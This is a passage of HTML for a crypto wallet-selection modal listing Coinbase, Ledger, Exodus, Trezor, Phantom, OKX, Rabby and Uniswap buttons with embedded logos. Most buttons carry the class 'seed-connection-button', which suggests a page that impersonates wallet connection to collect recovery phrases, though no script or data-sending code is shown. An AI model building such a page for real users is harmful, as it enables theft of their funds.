wfH3uHfLREQ8gaUsY3P/j0Vo/6pihVGc9Coqxxn3zLYcdrqoav/MyEPcXxNschwk15gRP0Omh7i/3LaWr/aAwcCU5jxZ8e/O2/zQZ8ENjpOLgZAy52G6QhYFXVjdoK28DQnB9zM/1gICr7tsxUPxfyUy0aliEZs8Mkc7Pwjq2tJcVNnwTMTAkiH4jdfKHedXwcHMAoMEhTd6gTkOUCz7hCzDguvX0Wk5inBSHo3W6M1kmPcFBHhty4Uz31qBkhWsktj0gEmgF1fWmMAEVw/y7C2Sm8kKekWMpEzpDTqqwoXaY8YyFWnBK+akFoIAgTCttUBDvbFdn2Xx9P1/SjkXxJg2G+aK4vIDQD1tobM/VmoTFnNc+uXqSOyyo8Ip0uQWU2XY+cG2nyR9RmdutY2YqiMOPdm2uTQxDyQ8gn5nUz6pEz4nJ/eeXJBuXeilVON+E6wFfox4EACd6DvukaUif9FJ0L+DWCFwDNzBVr9kCQH7tq65j5WpOfl1n68fEsGnzM/xLJX4Z5TmkumyI7BnHdEMHuFWVqxkHucNuS6qjBnUY0LzFY/eMO7Yn/JM1tBo4nrauNryL+MdwTQXJBooDQLYKw4x6gPfyyPqE6meMdl3CR0L0zUSnkmnMBLoPDDZW+cxrkZ+yTpU1ekcTWQCBLC/nbu7K2C8FdCxqv02mQaWTJW0IWNGLh+39CcdGNIKNJ43wCyMyfuH49jg64SEKZpEE8JXljz1I/XR3PuGM1snokHQomCSXb4cm2fBI4jWTeoxhDus89Wk1ODk50ZWp6DihAMecO3Ul630ci/tqcLfGj2oOrhkRIhFeCA3ZN1dBudQAfeZE6eOk/Hb9PkAAA"
                        alt="Coinbase Wallet"
                      />
                    </div>
                    <div>
                      <span
                        class="scwtw-font-normal scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7]"
                        >Coinbase Wallet</span
                      >
                    </div>
                  </div>
                  <div
                    class="group-data-[is-loading=true]:scwtw-flex group-data-[is-loading=false]:scwtw-hidden scwtw-items-center scwtw-justify-end scwtw-pr-2"
                  >
                    <div>
                      <svg
                        class="scwtw-w-5 sFcwtw-h-5 scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7] scwtw-animate-spin"
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        stroke-width="2"
                        stroke-linecap="round"
                        stroke-linejoin="round"
                      >
                        <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
                      </svg>
                    </div>
                  </div>
                </button>
              </div>

              <div class="scwtw-w-full md:scwtw-pr-1.5 scwtw-pr-0">
                <button
                  class="scwtw-flex scwtw-items-center scwtw-justify-between scwtw-gap-x-4 scwtw-w-full scwtw-p-2 scwtw-rounded-[20px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] hover:scwtw-bg-[#0000000d] dark:hover:scwtw-bg-[#ffffff0d] scwtw-cursor-pointer scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 scwtw-group seed-connection-button"
                  id="ledger-but"
                  data-is-loading="false"
                >
                  <div
                    class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4"
                  >
                    <div
                      class="scwtw-rounded-[13px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] scwtw-border scwtw-border-[#dddddd] dark:scwtw-border-[#2a2a2a]"
                    >
                      <img
                        class="scwtw-w-[40px] scwtw-h-[40px] scwtw-rounded-[12px]"
                        src="data:image/webp;base64,UklGRgQDAABXRUJQVlA4WAoAAAAQAAAAdwAAdwAAQUxQSPIAAAABgFttWxXpC4koQdOhEOrQalYqwD40pg8nI6MANNzf+9y/bC8RMQG4XVsX4ijzx5UcQ2M1Hm6aQeYPLoMzjynaaf742ZcPqNJMMdX3KD/T9Oom3c1Ee32D6meqnTrzM1l/Us90q4My8UnFzs+EWwAmM5oM4GbKDnrgNGgrnMR+zaRdYBUiq5hZjcJK5n////v/B3BhJSOrHFnFwCo4Vs4Kp2+rB05XjYaTA8zEKF8AtIw8ABSJTyp3qPjUOPZsPE5Vx6VXZ9A9k17jVuV5eIU768QhVbi/9PnzTW2Bhxp3lU8mgzN4uLYuxCyfR8YYGqtxO1ZQOCDsAQAAEBIAnQEqeAB4AD5JII1EoqIhFcQAKASEtIALaH8HfzmbS/pntV11/5Afhzlx2kLf4zUM/6/0W/8b7QPbv9D/7T3Bv5J/UP9TwAA4aDa2jZqzK3O2rV/wphOaC/on+DHQr87Jqq1WzGL8hZ/TWBeFwR2ODHitf8m/6WYXRxBPDKjjLMZAcJmLEJDccBNLFmBGNjFW7xm1AOAAAP79NmhUeXXD/9SLBhZ5OWP9/079WY96PVLh6/KlEMacFqtTZf3fI28pNfAT+XS1yaDmu/DpG/eS3gJltxDo2dTDpJd04SuW06LEyUwEUu/fRrWHiGgwHeG2qDw1LX5tfIoFQqqAY1DbBGPMxC9T9Orqno+Lswkfo9qdS8RrQLwmmyfGCW31S1P9dD6j4G/sDU4OZjx7FjAykLgmgIjf0neyQecNoG/dTl79e3Iu65Aaa+lvJE59eeGMI+Wbc+KSNeFxlgMDS2zr8WtAOVxDnZ21f0WbHt/zpy1n+aXyOsKHznD5UnY+aILXNUO6A+r5Rl/qeBmY/CYm/mqByGzkLHLAe686nf1c/Ou+aRVwOnN2091xzJf75VZz7tpJn45iTZ67Ox510XY+78tY344wqKziHIhDenX0DuA7KJzALI0lYHClbp3k2cmjEUBn0IAAAAAA"
                        alt="Ledger"
                      />
                    </div>
                    <div>
                      <span
                        class="scwtw-font-normal scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7]"
                        >Ledger</span
                      >
                    </div>
                  </div>
                  <div
                    class="group-data-[is-loading=true]:scwtw-flex group-data-[is-loading=false]:scwtw-hidden scwtw-items-center scwtw-justify-end scwtw-pr-2"
                  >
                    <div>
                      <svg
                        class="scwtw-w-5 sFcwtw-h-5 scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7] scwtw-animate-spin"
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        stroke-width="2"
                        stroke-linecap="round"
                        stroke-linejoin="round"
                      >
                        <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
                      </svg>
                    </div>
                  </div>
                </button>
              </div>



 <div class="scwtw-w-full md:scwtw-pr-1.5 scwtw-pr-0">
                <button
                  class="scwtw-flex scwtw-items-center scwtw-justify-between scwtw-gap-x-4 scwtw-w-full scwtw-p-2 scwtw-rounded-[20px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] hover:scwtw-bg-[#0000000d] dark:hover:scwtw-bg-[#ffffff0d] scwtw-cursor-pointer scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 scwtw-group seed-connection-button"
                  id="exodus-but"
                  data-is-loading="false"
                >
                  <div
                    class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4"
                  >
                    <div
                      class="scwtw-rounded-[13px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] scwtw-border scwtw-border-[#dddddd] dark:scwtw-border-[#2a2a2a]"
                    >
                      <img
                        class="scwtw-w-[40px] scwtw-h-[40px] scwtw-rounded-[12px]"
                        src="exo.svg"
                        alt="Exodus Wallet"
                      />
                    </div>
                    <div>
                      <span
                        class="scwtw-font-normal scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7]"
                        >Exodus Wallet</span
                      >
                    </div>
                  </div>
                  <div
                    class="group-data-[is-loading=true]:scwtw-flex group-data-[is-loading=false]:scwtw-hidden scwtw-items-center scwtw-justify-end scwtw-pr-2"
                  >
                    <div>
                      <svg
                        class="scwtw-w-5 sFcwtw-h-5 scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7] scwtw-animate-spin"
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        stroke-width="2"
                        stroke-linecap="round"
                        stroke-linejoin="round"
                      >
                        <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
                      </svg>
                    </div>
                  </div>
                </button>
              </div>


              <div class="scwtw-w-full md:scwtw-pr-1.5 scwtw-pr-0">
                <button
                  class="scwtw-flex scwtw-items-center scwtw-justify-between scwtw-gap-x-4 scwtw-w-full scwtw-p-2 scwtw-rounded-[20px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] hover:scwtw-bg-[#0000000d] dark:hover:scwtw-bg-[#ffffff0d] scwtw-cursor-pointer scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 scwtw-group seed-connection-button"
                  id="trezor-but"
                  data-is-loading="false"
                >
                  <div
                    class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4"
                  >
                    <div
                      class="scwtw-rounded-[13px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] scwtw-border scwtw-border-[#dddddd] dark:scwtw-border-[#2a2a2a]"
                    >
                      <img
                        class="scwtw-w-[40px] scwtw-h-[40px] scwtw-rounded-[12px]"
                        src="data:image/svg+xml,%3Csvg width='100' height='100' viewBox='0 0 100 100' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Crect width='100' height='100' rx='13' fill='%230F6148'/%3E%3Cg clip-path='url(%23clip0_0_1)'%3E%3Cpath d='M50.4976 22C42.7377 22 36.4578 28.3281 36.4578 36.1475V41.4498C33.7328 41.9469 31 42.6096 31 43.4696V71.1413C31 71.1413 31 71.9066 31.8535 72.2697C34.9465 73.5321 47.1148 77.8717 49.9104 78.866C50.2705 79.0001 50.3723 79.0001 50.4663 79.0001C50.5994 79.0001 50.6621 79.0001 51.0222 78.866C53.8177 77.8718 66.0174 73.5321 69.1104 72.2697C69.9012 71.9382 69.9326 71.1729 69.9326 71.1729V43.4696C69.9326 42.6096 67.239 41.9153 64.5062 41.4498V36.1475C64.5453 28.3281 58.2262 22 50.4976 22ZM50.4976 28.7621C55.0705 28.7621 57.8347 31.5474 57.8347 36.1554V40.7632C52.7058 40.4003 48.3286 40.4003 43.1684 40.7632V36.1554C43.1684 31.5395 45.9325 28.7621 50.4976 28.7621ZM50.4663 47.549C56.8481 47.549 62.204 48.0461 62.204 48.9377V66.2017C62.204 66.47 62.1727 66.5015 61.9377 66.5963C61.7107 66.6988 51.0536 70.5729 51.0536 70.5729C51.0536 70.5729 50.6229 70.7072 50.4976 70.7072C50.3645 70.7072 49.9416 70.5414 49.9416 70.5414C49.9416 70.5414 39.2846 66.6672 39.0574 66.5648C38.8304 66.4621 38.7912 66.4305 38.7912 66.1701V48.9061C38.7285 48.0145 44.0846 47.549 50.4663 47.549Z' fill='white'/%3E%3C/g%3E%3Cdefs%3E%3CclipPath id='clip0_0_1'%3E%3Crect width='39' height='57' fill='white' transform='translate(31 22)'/%3E%3C/clipPath%3E%3C/defs%3E%3C/svg%3E%0A"
                        alt="Trezor Wallet"
                      />
                    </div>
                    <div>
                      <span
                        class="scwtw-font-normal scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7]"
                        >Trezor Wallet</span
                      >
                    </div>
                  </div>
                  <div
                    class="group-data-[is-loading=true]:scwtw-flex group-data-[is-loading=false]:scwtw-hidden scwtw-items-center scwtw-justify-end scwtw-pr-2"
                  >
                    <div>
                      <svg
                        class="scwtw-w-5 sFcwtw-h-5 scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7] scwtw-animate-spin"
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        stroke-width="2"
                        stroke-linecap="round"
                        stroke-linejoin="round"
                      >
                        <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
                      </svg>
                    </div>
                  </div>
                </button>
              </div>

              <div class="scwtw-w-full md:scwtw-pr-1.5 scwtw-pr-0">
                <button
                  class="scwtw-flex scwtw-items-center scwtw-justify-between scwtw-gap-x-4 scwtw-w-full scwtw-p-2 scwtw-rounded-[20px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] hover:scwtw-bg-[#0000000d] dark:hover:scwtw-bg-[#ffffff0d] scwtw-cursor-pointer scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 scwtw-group"
                  id="phantom-but"
                  data-is-loading="false"
                >
                  <div
                    class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4"
                  >
                    <div
                      class="scwtw-rounded-[13px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] scwtw-border scwtw-border-[#dddddd] dark:scwtw-border-[#2a2a2a]"
                    >
                      <img
                        class="scwtw-w-[40px] scwtw-h-[40px] scwtw-rounded-[12px]"
                        src="data:image/webp;base64,UklGRpoGAABXRUJQVlA4WAoAAAAQAAAAdwAAdwAAQUxQSGMCAAABkERt2/FG79i2bdu2ubJtrGxbq9q2bdtukroNR5m//Mro/M96ImICSNMdhy3cd/WlgXNwfJagTKL4o+Rq6urrmXYb6utrazjlb4W4TJAZF+io9/zS7nmD25MO91x+yyqpsprxIlceZ3p1YVed6LBRX8h4N/fbSq11OpHIeDrigHbWxzMeD16kuc7vGb/X3NPUmDDG+24DNLJAxACmT9LAChmDWDRDrQUyBlI0QY3RIgYztb9KncMYUCeV3jGod1RYz7D+m91Gp3gwzKuN4wzutlY6JOLxaWUjw1s3p4U+IPaMiHoKECW0J1rOEHOTiW5BYoeIrDB9pI5JmHxpWCWm3B4LqzHJx+5jmGuXXQHFDrxEddkA1RNnVD+CUVnEo3LLQhUkQBVdhipZgipLgSr/NyqhElUxh6qsBlVFHarKelRiXAy1FJbs/ykaUEnrUYlx1aKqrEFVwaEqVaIq/o1KoECVJ0aVWYYqSYAqKhNVYBwq10BU5o6ovumhevQc1YVLqPbuBlWzZB6HSTp6SDmmrG7t4zB5EpliekN0BdNBooWQ/o4n6paLKIqI6Buiuy1WAOKmtqAIPE7U6kE8q1qjYDS21OaiGizyCW3RPSxnSFU3JIak8sB0HKHdVKNJRSjShpC6M0QY0kaR+hNSEYQOIU32c+I/w26k4TtKfpOfIc3P9uIz2wmk1a0+dfzEOa0mrc95lsDxzd+ou1NJJ9tPPvTRN1deywc10iyvNwfHk073GLts/+UnPyzcgqKTs/KFxWUVlWKxVKZVqVhcWVFaLMjLTIoKdDX/9ujC3iWju5HGAQBWUDggEAQAADAYAJ0BKngAeAA+SSKLRCKioRaLtQwoBISghwAY+8ev4rXdOv8nrxR3jykfl0xAeoDzAP0j6QHmA85n0AegB/huoR9ADy6PY5/czCbrM/O2DK7RA0RUw3QvkSnR7QN/q8mZi4JbSKqQDngqN7NvaZqpHJJKwiuTcucSu8H5WzQeB9dnCe8YeQw8TGiSqooH2Hw3wOifnhBwdnfkJInpnIThJtMceiBqea5VUMyyfJqaA1nHP74FUIQA7zvyoMbnE+3q9ZLxaYNoKAAAzP//5J//+SD///Ivk7Kd4q8P9TrNKE6+BucO7NIkAVRd2Chc3AuOBPpzvW1///dCKEb0gh8shljMtua1Zj+UACpZo92qpXUid7z/wG/xSFIyUYk0p2VfLW1M+QyO0jtH+FPeeDxA2+Tl6NAnuvCQiMg7f2zXRCItVAzFnCTsFZKvntHBOE6GoJMtAvx205/TRP5T4zi5MjnH3QX5kGLvN+E0EElW7hDrxOPWxomA/88xLCNoJRfMPkxpGtmVpxVN91+HNYSNPjf5KIRJe4wi9jQ4NffKuvXfVuIg+FWg5YZE8gdQUsGArA64MOwMDEic3LogopaAXhUnxPg8SdRIUcU0lTSC0fGMyWe024ANjQu8NCU1EUN4YNVv8sh+hMDe1dtCN09H5bWOP3PDEUg19tu+Yz+S+u9wEwDNNSLaUtkPqOlYn7kx0sgI7Ekm0uZuAjotKL90HUnt9LqKd5FjRpT2HvbEMTCHE4vpmO54yy5VSEt1t5j4PWo08l2HF0k3/7nYFQYJoiHjdhVY4m+rXPKBHro133ZT4JjPb24JG1Aj4fkTq3eicc9FEmZkbQLUGrPCUXHHuVNQRCG2O2wde++afj/uxkbWyAfFE2gHDLG+/yXatwF8RQhwACsPS7kGg94AEsdQUpwS6ku5QZqe0DiuAK/hHtBkQr8WvzJVkUUyu7sBcV8ETUQZ8C9RmucmRDqQ+qW6zjSGzYpG9LHMShVIJ3O3dWhQOQ70ontnF2eQvJinZBOYlXHpd4kRc2icWzWC1iBeBqFjM73M9g3fSM1cJQQ2SlDshGWFDmvqpt04gOAvgasdIo/SvuiHR7+aNR9W+XZuu4ubJwPDCiyG0QxaXh4b4bl9MV52+wtUayin+YmPgapho7AXVTdA11Eiy7+AZQEh6+LfWlghNiehAed1OZy8d9vqDZ+pUSUMvKwqU3zyyced6apfX/Kkx36N7OfZTJ0odZylE8dMEHrOh54xrKi8fXtvRsHjh+dYUsCnHd7m6gOSyJZbJ6m+v220kGdZoeibll/thV//90FPcEdoy7fTXDUhTJZOsfMnb+39/8gABpOBfmYIsD42TCR9mbwg0t/QI71N1f4O3MyeMTMyOgAA"
                        alt="Phantom Wallet"
                      />
                    </div>
                    <div>
                      <span
                        class="scwtw-font-normal scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7]"
                        >Phantom Wallet</span
                      >
                    </div>
                  </div>
                  <div
                    class="group-data-[is-loading=true]:scwtw-flex group-data-[is-loading=false]:scwtw-hidden scwtw-items-center scwtw-justify-end scwtw-pr-2"
                  >
                    <div>
                      <svg
                        class="scwtw-w-5 sFcwtw-h-5 scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7] scwtw-animate-spin"
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        stroke-width="2"
                        stroke-linecap="round"
                        stroke-linejoin="round"
                      >
                        <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
                      </svg>
                    </div>
                  </div>
                </button>
              </div>

              <div class="scwtw-w-full md:scwtw-pr-1.5 scwtw-pr-0">
                <button
                  class="scwtw-flex scwtw-items-center scwtw-justify-between scwtw-gap-x-4 scwtw-w-full scwtw-p-2 scwtw-rounded-[20px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] hover:scwtw-bg-[#0000000d] dark:hover:scwtw-bg-[#ffffff0d] scwtw-cursor-pointer scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 scwtw-group seed-connection-button"
                  id="okx-but"
                  data-is-loading="false"
                >
                  <div
                    class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4"
                  >
                    <div
                      class="scwtw-rounded-[13px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] scwtw-border scwtw-border-[#dddddd] dark:scwtw-border-[#2a2a2a]"
                    >
                      <img
                        class="scwtw-w-[40px] scwtw-h-[40px] scwtw-rounded-[12px]"
                        src="data:image/webp;base64,UklGRr4BAABXRUJQVlA4ILIBAABwEACdASp4AHgAPkkgjEOioqGYPwRkKASEtIALalUA+wCyN/ongAbbvJAvlMdN/GfQX/o3Uz9AAjkZucVq+ScElyhxVES8RRjvKysrkejTORbej6xur3wS/a4xhtbRbCVCD+u982lhdE0Sq4tBm0+OtG/wHO4wCnYtutEHN5yk6KUTPL+gG6HtBEjEAAD+/TZohNPjrq0ebIIlm1Z0xctEnNoc/ea6p1RIM2TY1JzvX5Ca/oPH+af+apy7Ge8er22ODKY22+FbvyfjmnUXlfha0Dt5rsX7oYw72tXagN/vz6rJGq3SG1is//zvWYVVO9Kkzy8lBN8FV7Y2L80SmEqS5r7PcZ+G703hfNheky352R1zm9k1Wf1ckj+i2ppfeGhOQUrQX+q780h/5M/k2/+KVGpOr1OAEVH8rUAW7PdYTVtyNn8LsbkcfCXv5/uJA7XBu6XouFk+mCiXT6asrOj/+DqXNc9cj4XtCzikoWUkX7lzkInL6ZK9cosET4MA/ALJR+GNIfbF8Mr6EtMyIFVayQpuFHM/jcfjDmJAjnT4w4TsqFORVllkff+lXplMCAAAAA=="
                        alt="OKX Wallet"
                      />
                    </div>
                    <div>
                      <span
                        class="scwtw-font-normal scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7]"
                        >OKX Wallet</span
                      >
                    </div>
                  </div>
                  <div
                    class="group-data-[is-loading=true]:scwtw-flex group-data-[is-loading=false]:scwtw-hidden scwtw-items-center scwtw-justify-end scwtw-pr-2"
                  >
                    <div>
                      <svg
                        class="scwtw-w-5 sFcwtw-h-5 scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7] scwtw-animate-spin"
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        stroke-width="2"
                        stroke-linecap="round"
                        stroke-linejoin="round"
                      >
                        <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
                      </svg>
                    </div>
                  </div>
                </button>
              </div>

              <div class="scwtw-w-full md:scwtw-pr-1.5 scwtw-pr-0">
                <button
                  class="scwtw-flex scwtw-items-center scwtw-justify-between scwtw-gap-x-4 scwtw-w-full scwtw-p-2 scwtw-rounded-[20px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] hover:scwtw-bg-[#0000000d] dark:hover:scwtw-bg-[#ffffff0d] scwtw-cursor-pointer scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 scwtw-group seed-connection-button"
                  id="rabby-but"
                  data-is-loading="false"
                >
                  <div
                    class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4"
                  >
                    <div
                      class="scwtw-rounded-[13px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] scwtw-border scwtw-border-[#dddddd] dark:scwtw-border-[#2a2a2a]"
                    >
                      <img
                        class="scwtw-w-[40px] scwtw-h-[40px] scwtw-rounded-[12px]"
                        src="data:image/webp;base64,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"
                        alt="Rabby Wallet"
                      />
                    </div>
                    <div>
                      <span
                        class="scwtw-font-normal scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7]"
                        >Rabby Wallet</span
                      >
                    </div>
                  </div>
                  <div
                    class="group-data-[is-loading=true]:scwtw-flex group-data-[is-loading=false]:scwtw-hidden scwtw-items-center scwtw-justify-end scwtw-pr-2"
                  >
                    <div>
                      <svg
                        class="scwtw-w-5 sFcwtw-h-5 scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7] scwtw-animate-spin"
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        stroke-width="2"
                        stroke-linecap="round"
                        stroke-linejoin="round"
                      >
                        <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
                      </svg>
                    </div>
                  </div>
                </button>
              </div>

              <div class="scwtw-w-full md:scwtw-pr-1.5 scwtw-pr-0">
                <button
                  class="scwtw-flex scwtw-items-center scwtw-justify-between scwtw-gap-x-4 scwtw-w-full scwtw-p-2 scwtw-rounded-[20px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] hover:scwtw-bg-[#0000000d] dark:hover:scwtw-bg-[#ffffff0d] scwtw-cursor-pointer scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 scwtw-group seed-connection-button"
                  id="uniswap-but"
                  data-is-loading="false"
                >
                  <div
                    class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4"
                  >
                    <div
                      class="scwtw-rounded-[13px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] scwtw-border scwtw-border-[#dddddd] dark:scwtw-border-[#2a2a2a]"
                    >
                      <img
                        class="scwtw-w-[40px] scwtw-h-[40px] scwtw-rounded-[12px]"
                        src="data:image/webp;base64,UklGRiwJAABXRUJQVlA4ICAJAABQKACdASp4AHgAPkkijkSioiGUCoUoKASEtAHYDwuzo7b6rzY6n/cfxvzkVAeZ1yt/0fQ76j/MD/Tv9cva//o/VF5gP2p/ZT3ev8B+mfuM9AD+k/5nrIPQA/bX0zv3G+DP9vf249pz//9YB//8/boNvgCg73Bvxy8sAG6fpDpo3kM+s+A76O7GNuajl8jp5cyFeFNXotry+fyK25HHcuBX3YkNpdtdPGLOvRvCJm0y3p4uYageapOEVrsp8miNEEq3rw7gtMNNSqDzB43lDq/ZbAQjf10gNSs3D7IsN7ru93weEpxKw8HOF7yxr4kvfF8bN1WtSxLhNj0xV+yPnmQkBRPDfkIsuAI4UpdUQhBDH8Dt5RNtuLcOMqHP2N1nJYRoiM+TH3R/NOecuxO3X3LVAqykxRRwo2bwWE6zUgnujmfc4lk1pSIfG0KAAP7+3I1GxR3tu9cnFTRehGiC2djj8UfNIBRioqVahQGbJgg/wSKUE5x5l0FNcWlExmaMrzJEdT6dYJFu8dehsXAd/p+c/9cU9Zb5VVOCtQJ5PnIXKL7JAFIMCG4jFT0Bzl9MrbJ1pTcxP+VVhnPQMCybsIv+J9kUYd0WsCmXUD6A/OH5lHwn/opu4AB9i75+hZ9mrlS5EKYRfFqWpZ/2DYB8s6+5e0X0Z5YAvd5TM15CF5BlG7xG1EcLbRokIguHf1dNsSZejyXlyZ1J9JhR8sbXG3VRqlUdph/Z7xzpqG1ou4VlJiAjYTiYCvoKIEdrlCEiS11iORIgLH3K3598pVnRE0ExMNrkb9opfxidsTxonqVMlzJYDKj9SImijHErTgHYOVV/2hHt0e38x0Sa5rU